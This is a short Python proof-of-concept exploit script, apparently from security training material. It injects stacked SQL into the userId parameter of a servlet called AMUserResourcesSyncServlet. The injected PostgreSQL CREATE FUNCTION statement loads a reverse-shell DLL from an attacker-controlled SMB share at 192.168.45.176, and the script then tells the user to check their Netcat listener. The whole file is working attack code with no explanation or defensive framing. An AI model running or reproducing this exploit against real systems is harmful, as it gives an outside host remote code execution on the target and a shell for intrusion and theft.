import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit():
    if len(sys.argv) != 2:
        print("Usage: python3 poc.py TARGET-HOST:TARGET-PORT")
        sys.exit(1)

    target = sys.argv[1]

    payload = "CREATE OR REPLACE FUNCTION dummy_function(int) RETURNS int AS $$\\\\192.168.45.176\\awae\\reverse_shell.dll$$, $$dummy_function$$ LANGUAGE C STRICT;"

    url = f"https://{target}/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;{payload}"

    response = requests.get(url, verify=False)

    if response.status_code == 200:
        print("Check your Netcat:")

if __name__ == "__main__":
    exploit()
